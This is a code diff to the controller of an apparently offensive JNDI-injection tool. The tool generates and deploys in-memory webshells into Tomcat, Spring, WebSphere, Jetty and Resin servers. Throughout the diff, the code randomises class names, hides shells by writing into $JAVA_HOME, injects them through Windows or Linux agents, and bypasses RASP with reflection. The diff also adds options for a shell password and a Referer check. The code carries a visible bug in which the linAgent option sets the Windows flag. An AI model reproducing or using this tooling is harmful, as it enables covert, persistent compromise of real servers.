@@ -8,7 +8,6 @@ import com.nu1r.jndi.gadgets.Config.Config;
 import com.nu1r.jndi.gadgets.utils.InjShell;
 import com.nu1r.jndi.gadgets.utils.Util;
 import com.nu1r.jndi.template.*;
-import com.nu1r.jndi.template.Agent.WinMenshell;
 import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
 import com.nu1r.jndi.template.Websphere.WebsphereMemshellTemplate;
 import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
@@ -17,23 +16,24 @@ import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
 import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
 import com.nu1r.jndi.template.resin.RFMSFromThreadF;
 import com.nu1r.jndi.template.resin.RSMSFromThreadS;
+import com.nu1r.jndi.template.spring.SpringControllerMS;
 import com.nu1r.jndi.template.spring.SpringInterceptorMS;
-import com.nu1r.jndi.template.spring.SpringMemshellTemplate;
 import com.nu1r.jndi.template.tomcat.*;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import org.apache.commons.cli.*;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
-import javassist.NotFoundException;
 import org.apache.commons.codec.binary.Base64;
 
 import java.net.URL;
 
 import static com.nu1r.jndi.gadgets.Config.Config.*;
 import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
+import static com.nu1r.jndi.gadgets.utils.HexUtils.generatePassword;
 import static com.nu1r.jndi.gadgets.utils.InjShell.*;
 import static org.fusesource.jansi.Ansi.ansi;
 
@@ -44,6 +44,7 @@ public class BasicController implements LdapController {
     private static PayloadType payloadType;
     private        String[]    params;
     private        GadgetType  gadgetType;
+    public static  CommandLine cmdLine;
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
@@ -97,34 +98,10 @@ public class BasicController implements LdapController {
                     className = WebsphereMemshellTemplate.class.getName();
                     break;
                 case springinterceptor:
-                    Config.init();
-                    pool = ClassPool.getDefault();
-                    pool.insertClassPath(new ClassClassPath(SpringInterceptorMS.class));
-                    ctClass = pool.get(SpringInterceptorMS.class.getName());
-                    pool.insertClassPath(new ClassClassPath(SpringMemshellTemplate.class));
-                    String target = "com.nu1r.jndi.template.spring.SpringMemshellTemplate";
-                    CtClass springTemplateClass = pool.get(target);
-                    // 类名后加时间戳
-                    String clazzName = target + System.nanoTime();
-                    springTemplateClass.setName(clazzName);
-                    String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
-                    // 修改b64字节码
-                    String b64content = "b64=\"" + encode + "\";";
-                    ctClass.makeClassInitializer().insertBefore(b64content);
-                    // 修改 SpringInterceptorMemShell 随机命名 防止二次打不进去
-                    String clazzNameContent = "clazzName=\"" + clazzName + "\";";
-                    ctClass.makeClassInitializer().insertBefore(clazzNameContent);
-                    ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
-                    if (winAgent) {
-                        className = insertWinAgent(ctClass);
-                        break;
-                    }
-                    if (linAgent) {
-                        className = insertLinAgent(ctClass);
-                        break;
-                    }
-                    className = ctClass.getName();
-                    ctClass.writeFile();
+                    className = structureShell(SpringInterceptorMS.class);
+                    break;
+                case springcontroller:
+                    className = structureShell(SpringControllerMS.class);
                     break;
                 case issuccess:
                     className = isSuccess.class.getName();
@@ -136,10 +113,97 @@ public class BasicController implements LdapController {
                     className = structureShell(JSMSFromJMXS.class);
                     break;
                 case wsfilter:
-                    className = structureShell(WSFMSFromThread.class);
+                    Config.init();
+                    pool = ClassPool.getDefault();
+                    pool.insertClassPath(new ClassClassPath(WSFMSFromThread.class));
+                    ctClass = pool.get(WSFMSFromThread.class.getName());
+                    InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "ws");
+                    ctClass.setName(generateClassName());
+                    if (winAgent) {
+                        className = insertWinAgent(ctClass);
+                        ctClass.writeFile();
+                        break;
+                    }
+                    if (linAgent) {
+                        className = insertLinAgent(ctClass);
+                        ctClass.writeFile();
+                        break;
+                    }
+                    if (HIDE_MEMORY_SHELL) {
+                        switch (HIDE_MEMORY_SHELL_TYPE) {
+                            case 1:
+                                break;
+                            case 2:
+                                CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                                newClass.setName(generateClassName());
+                                String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
+                                className = "className=\"" + ctClass.getName() + "\";";
+                                newClass.defrost();
+                                newClass.makeClassInitializer().insertBefore(content);
+                                newClass.makeClassInitializer().insertBefore(className);
+
+                                if (IS_INHERIT_ABSTRACT_TRANSLET) {
+                                    Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                                    CtClass superClass = pool.get(abstTranslet.getName());
+                                    newClass.setSuperclass(superClass);
+                                }
+
+                                className = newClass.getName();
+                                newClass.writeFile();
+                                break;
+                        }
+                    }
+                    className = ctClass.getName();
+                    ctClass.writeFile();
                     break;
                 case tomcatexecutor:
-                    className = structureShell(TWSMSFromThread.class);
+                    Config.init();
+                    pool = ClassPool.getDefault();
+                    pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
+                    ctClass = pool.get(TWSMSFromThread.class.getName());
+                    InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "execute");
+                    ctClass.setName(generateClassName());
+                    if (winAgent) {
+                        className = insertWinAgent(ctClass);
+                        ctClass.writeFile();
+                        break;
+                    }
+                    if (linAgent) {
+                        className = insertLinAgent(ctClass);
+                        ctClass.writeFile();
+                        break;
+                    }
+                    if (HIDE_MEMORY_SHELL) {
+                        switch (HIDE_MEMORY_SHELL_TYPE) {
+                            case 1:
+                                break;
+                            case 2:
+                                CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                                newClass.setName(generateClassName());
+                                String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
+                                className = "className=\"" + ctClass.getName() + "\";";
+                                newClass.defrost();
+                                newClass.makeClassInitializer().insertBefore(content);
+                                newClass.makeClassInitializer().insertBefore(className);
+
+                                if (IS_INHERIT_ABSTRACT_TRANSLET) {
+                                    Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                                    CtClass superClass = pool.get(abstTranslet.getName());
+                                    newClass.setSuperclass(superClass);
+                                }
+
+                                className = newClass.getName();
+                                newClass.writeFile();
+                                break;
+                        }
+                    }
+                    if (IS_INHERIT_ABSTRACT_TRANSLET) {
+                        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                        CtClass superClass = pool.get(abstTranslet.getName());
+                        ctClass.setSuperclass(superClass);
+                    }
+                    className = ctClass.getName();
+                    ctClass.writeFile();
                     break;
                 case resinfilterth:
                     className = structureShell(RFMSFromThreadF.class);
@@ -148,7 +212,48 @@ public class BasicController implements LdapController {
                     className = structureShell(RSMSFromThreadS.class);
                     break;
                 case tomcatupgrade:
-                    className = structureShell(TUGMSFromJMXuP.class);
+                    Config.init();
+                    pool = ClassPool.getDefault();
+                    pool.insertClassPath(new ClassClassPath(TUGMSFromJMXuP.class));
+                    ctClass = pool.get(TUGMSFromJMXuP.class.getName());
+                    InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "upgrade");
+                    ctClass.setName(generateClassName());
+                    if (winAgent) {
+                        className = insertWinAgent(ctClass);
+                        ctClass.writeFile();
+                        break;
+                    }
+                    if (linAgent) {
+                        className = insertLinAgent(ctClass);
+                        ctClass.writeFile();
+                        break;
+                    }
+                    if (HIDE_MEMORY_SHELL) {
+                        switch (HIDE_MEMORY_SHELL_TYPE) {
+                            case 1:
+                                break;
+                            case 2:
+                                CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                                newClass.setName(generateClassName());
+                                String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
+                                className = "className=\"" + ctClass.getName() + "\";";
+                                newClass.defrost();
+                                newClass.makeClassInitializer().insertBefore(content);
+                                newClass.makeClassInitializer().insertBefore(className);
+
+                                if (IS_INHERIT_ABSTRACT_TRANSLET) {
+                                    Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                                    CtClass superClass = pool.get(abstTranslet.getName());
+                                    newClass.setSuperclass(superClass);
+                                }
+
+                                className = newClass.getName();
+                                newClass.writeFile();
+                                break;
+                        }
+                    }
+                    className = ctClass.getName();
+                    ctClass.writeFile();
                     break;
             }
 
@@ -168,6 +273,10 @@ public class BasicController implements LdapController {
             er.printStackTrace();
         }
 
+    }
+
+    public static void main(String[] args) {
+        System.out.println(ansi().fgRgb(188,232,105).render(" Windows下使用Agent写入"));
     }
 
     @Override
@@ -190,43 +299,83 @@ public class BasicController implements LdapController {
                 try {
                     gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                 } catch (IllegalArgumentException e) {
-                    throw new UnSupportedPayloadTypeException("UnSupportedGadgetType: " + base.substring(secondIndex + 1, thirdIndex));
+                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                 }
             }
 
             if (gadgetType == GadgetType.shell) {
-                String url1    = Util.getCmdFromBase(base);
-                int    result1 = url1.indexOf("-");
-                if (result1 != -1) {
-                    String[] U = url1.split("-");
-                    int      i = U.length;
-                    if (i >= 1) {
-                        URL_PATTERN = U[0];
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + U[0]));
-                    }
+                String   arg     = Util.getCmdFromBase(base);
+                String[] args    = arg.split(" ");
+                Options  options = new Options();
+                options.addOption("t", "typefggg", false, "选择内存马的类型");
+                options.addOption("a", "AbstractTranslet", false, "是否继承恶意类 AbstractTranslet");
+                options.addOption("o", "obscure", false, "使用反射绕过");
+                options.addOption("w", "winAgent", false, "Windows下使用Agent写入");
+                options.addOption("l", "linAgent", false, "Linux下使用Agent写入");
+                options.addOption("u", "url", true, "内存马绑定的路径,default [/version.txt]");
+                options.addOption("pw", "password", true, "内存马的密码,default [p@ssw0rd]");
+                options.addOption("r", "referer", true, "内存马 Referer check,default [https://nu1r.cn/]");
+                options.addOption("h", "hide-mem-shell", false, "通过将文件写入$JAVA_HOME来隐藏内存shell，目前只支持SpringController");
+                options.addOption("ht", "hide-type", true, "隐藏内存外壳，输入1:write /jre/lib/charsets.jar 2:write /jre/classes/");
 
-                    if (i >= 2) {
-                        Shell_Type = U[1];
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellType >> |@" + U[1]));
-                    }
+                CommandLineParser parser = new DefaultParser();
 
-                    if (url1.contains("obscure")) {
-                        IS_OBSCURE = true;
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@"));
-                    }
+                try {
+                    cmdLine = parser.parse(options, args);
+                } catch (Exception e) {
+                    System.out.println("[*] Parameter input error, please use -h for more information");
+                }
 
-                    if (url1.contains("winAgent")) {
-                        winAgent = true;
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Windows下使用Agent写入 |@"));
-                    }
+                if (cmdLine.hasOption("typefggg")) {
+                    Shell_Type = cmdLine.getOptionValue("typefggg");
+                    //System.out.println("[+] 内存shell :" + Shell_Type);
+                }
 
-                    if (url1.contains("linAgent")) {
-                        linAgent = true;
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Linux下使用Agent写入 |@"));
+                if (cmdLine.hasOption("winAgent")) {
+                    winAgent = true;
+                    System.out.println(ansi().fgRgb(188,232,105).render("[+] Windows下使用Agent写入"));
+                }
+
+                if (cmdLine.hasOption("linAgent")) {
+                    winAgent = true;
+                    System.out.println(ansi().fgRgb(188,232,105).render("[+] Linux下使用Agent写入"));
+                }
+
+                if (cmdLine.hasOption("obscure")) {
+                    IS_OBSCURE = true;
+                    System.out.println(ansi().fgRgb(188,232,105).render("[+] 使用反射绕过RASP"));
+                }
+
+                if (cmdLine.hasOption("url")) {
+                    String url = cmdLine.getOptionValue("url");
+                    if (!url.startsWith("/")) {
+                        url = "/" + url;
                     }
-                } else {
-                    URL_PATTERN = url1;
-                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + url1));
+                    URL_PATTERN = url;
+                    System.out.println("[+] Path：" + URL_PATTERN);
+                }
+
+                if (cmdLine.hasOption("password")) {
+                    PASSWORD = generatePassword(cmdLine.getOptionValue("password"));
+                    System.out.println("[+] Password：" + PASSWORD);
+                }
+
+                if (cmdLine.hasOption("referer")) {
+                    REFERER = cmdLine.getOptionValue("referer");
+                    System.out.println("[+] referer：" + REFERER);
+                }
+
+                if (cmdLine.hasOption("AbstractTranslet")) {
+                    IS_INHERIT_ABSTRACT_TRANSLET = true;
+                    System.out.println("[+] 继承恶意类AbstractTranslet");
+                }
+
+                if (cmdLine.hasOption("hide-mem-shell")) {
+                    HIDE_MEMORY_SHELL = true;
+
+                    if (cmdLine.hasOption("hide-type")) {
+                        HIDE_MEMORY_SHELL_TYPE = Integer.parseInt(cmdLine.getOptionValue("hide-type"));
+                    }
                 }
             }
 
